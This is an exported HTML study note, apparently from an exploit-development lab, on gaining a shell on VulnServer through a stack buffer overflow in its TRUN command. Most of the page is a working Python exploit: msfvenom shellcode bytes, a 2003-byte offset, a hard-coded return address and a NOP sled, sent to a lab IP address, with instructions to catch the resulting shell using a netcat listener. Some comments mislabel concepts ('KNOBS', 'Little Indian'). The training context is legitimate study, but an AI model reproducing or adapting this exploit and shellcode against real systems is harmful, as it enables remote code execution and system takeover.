<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Generating Shellcode and Gaining Root</title>
</head><body>&nbsp; &nbsp; &nbsp; &nbsp; <b>Generating Shellcode and Gaining Root</b><br/>
<br/>
<br/>
We can generate our shellcode with MSFVenom:<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmph3wu0o\1.png" /><br/>
<img src="1.png" /><br/>
<br/>
<img src="2.png" /><br/>
<br/>
<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmph3wu0o\2.png" /><br/>
<br/>
<br/>
Here we need to eddit our previous Python script:<br/>
<b>final_script.py</b><br/>
<span style="color: #0088ff">#!/usr/bin/python</span><br/>
import sys, socket<br/>
<br/>
overflow = <span style="color: #ff9d00">(</span>&nbsp;<br/>
<span style="color: #3ad900">"\xdd\xc6\xd9\x74\x24\xf4\xbb\x2b\x97\x37\xe1\x5e\x2b\xc9\xb1"</span><br/>
<span style="color: #3ad900">"\x52\x83\xc6\x04\x31\x5e\x13\x03\x75\x84\xd5\x14\x75\x42\x9b"</span><br/>
<span style="color: #3ad900">"\xd7\x85\x93\xfc\x5e\x60\xa2\x3c\x04\xe1\x95\x8c\x4e\xa7\x19"</span><br/>
<span style="color: #3ad900">"\x66\x02\x53\xa9\x0a\x8b\x54\x1a\xa0\xed\x5b\x9b\x99\xce\xfa"</span><br/>
<span style="color: #3ad900">"\x1f\xe0\x02\xdc\x1e\x2b\x57\x1d\x66\x56\x9a\x4f\x3f\x1c\x09"</span><br/>
<span style="color: #3ad900">"\x7f\x34\x68\x92\xf4\x06\x7c\x92\xe9\xdf\x7f\xb3\xbc\x54\x26"</span><br/>
<span style="color: #3ad900">"\x13\x3f\xb8\x52\x1a\x27\xdd\x5f\xd4\xdc\x15\x2b\xe7\x34\x64"</span><br/>
<span style="color: #3ad900">"\xd4\x44\x79\x48\x27\x94\xbe\x6f\xd8\xe3\xb6\x93\x65\xf4\x0d"</span><br/>
<span style="color: #3ad900">"\xe9\xb1\x71\x95\x49\x31\x21\x71\x6b\x96\xb4\xf2\x67\x53\xb2"</span><br/>
<span style="color: #3ad900">"\x5c\x64\x62\x17\xd7\x90\xef\x96\x37\x11\xab\xbc\x93\x79\x6f"</span><br/>
<span style="color: #3ad900">"\xdc\x82\x27\xde\xe1\xd4\x87\xbf\x47\x9f\x2a\xab\xf5\xc2\x22"</span><br/>
<span style="color: #3ad900">"\x18\x34\xfc\xb2\x36\x4f\x8f\x80\x99\xfb\x07\xa9\x52\x22\xd0"</span><br/>
<span style="color: #3ad900">"\xce\x48\x92\x4e\x31\x73\xe3\x47\xf6\x27\xb3\xff\xdf\x47\x58"</span><br/>
<span style="color: #3ad900">"\xff\xe0\x9d\xcf\xaf\x4e\x4e\xb0\x1f\x2f\x3e\x58\x75\xa0\x61"</span><br/>
<span style="color: #3ad900">"\x78\x76\x6a\x0a\x13\x8d\xfd\xf5\x4c\x86\x7c\x9d\x8e\x98\x6f"</span><br/>
<span style="color: #3ad900">"\x02\x06\x7e\xe5\xaa\x4e\x29\x92\x53\xcb\xa1\x03\x9b\xc1\xcc"</span><br/>
<span style="color: #3ad900">"\x04\x17\xe6\x31\xca\xd0\x83\x21\xbb\x10\xde\x1b\x6a\x2e\xf4"</span><br/>
<span style="color: #3ad900">"\x33\xf0\xbd\x93\xc3\x7f\xde\x0b\x94\x28\x10\x42\x70\xc5\x0b"</span><br/>
<span style="color: #3ad900">"\xfc\x66\x14\xcd\xc7\x22\xc3\x2e\xc9\xab\x86\x0b\xed\xbb\x5e"</span><br/>
<span style="color: #3ad900">"\x93\xa9\xef\x0e\xc2\x67\x59\xe9\xbc\xc9\x33\xa3\x13\x80\xd3"</span><br/>
<span style="color: #3ad900">"\x32\x58\x13\xa5\x3a\xb5\xe5\x49\x8a\x60\xb0\x76\x23\xe5\x34"</span><br/>
<span style="color: #3ad900">"\x0f\x59\x95\xbb\xda\xd9\xb5\x59\xce\x17\x5e\xc4\x9b\x95\x03"</span><br/>
<span style="color: #3ad900">"\xf7\x76\xd9\x3d\x74\x72\xa2\xb9\x64\xf7\xa7\x86\x22\xe4\xd5"</span><br/>
<span style="color: #3ad900">"\x97\xc6\x0a\x49\x97\xc2"</span><span style="color: #ff9d00">)</span><br/>
<br/>
<span style="color: #0088ff"># We are sending A until the offset (2003), then adding the Return Address</span><br/>
<span style="color: #0088ff"># Return Address: 625011af</span><br/>
<span style="color: #0088ff"># When we talk with x86 architectures, we are using Little Indian Format:</span><br/>
<span style="color: #0088ff"># https://en.wikipedia.org/wiki/Endianness</span><br/>
<br/>
<span style="color: #0088ff"># The "\x90" * 32 is called "KNOBS": it is litteraly a padding</span><br/>
<span style="color: #0088ff"># Can help to run the code if something is interfering</span><br/>
<br/>
offset = <span style="color: #3ad900">"A"</span>&nbsp;* 2003 + <span style="color: #3ad900">"\xaf\x11\x50\x62"</span>&nbsp;+ <span style="color: #3ad900">"\x90"</span>&nbsp;* 32 + overflow<br/>
try<span style="color: #ff9d00">:</span><br/>
&nbsp;s = socket.socket<span style="color: #ff9d00">(</span>socket.AF_INET, socket.SOCK_STREAM<span style="color: #ff9d00">)</span><br/>
&nbsp;s.connect<span style="color: #ff9d00">((</span><span style="color: #3ad900">'192.168.11.131'</span>,9999<span style="color: #ff9d00">))</span>&nbsp;<span style="color: #0088ff">#Change with VulnServer IP Address</span><br/>
&nbsp;s.send<span style="color: #ff9d00">((</span><span style="color: #3ad900">'TRUN /.:/'</span>&nbsp;+ offset<span style="color: #ff9d00">))</span><br/>
&nbsp;s.<span style="color: #ffdd00">close()</span><br/>
<br/>
except<span style="color: #ff9d00">:</span><br/>
&nbsp;print <span style="color: #3ad900">"Error connecting to server!!!"</span><br/>
&nbsp;sys.<span style="color: #ffdd00">exit()</span><br/>
<br/>
<br/>
<br/>
This time, we can run VulnServer without the Immunity Debugger,<br/>
Set up a listener (like netcat) and run the script<br/>
<img src="1 2.png" /><br/>
<img src="2 2.png" /><br/>
<img src="3.png" /><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmph3wu0o\3.png" /><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmph3wu0o\4.png" /><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmph3wu0o\5.png" /></body></html>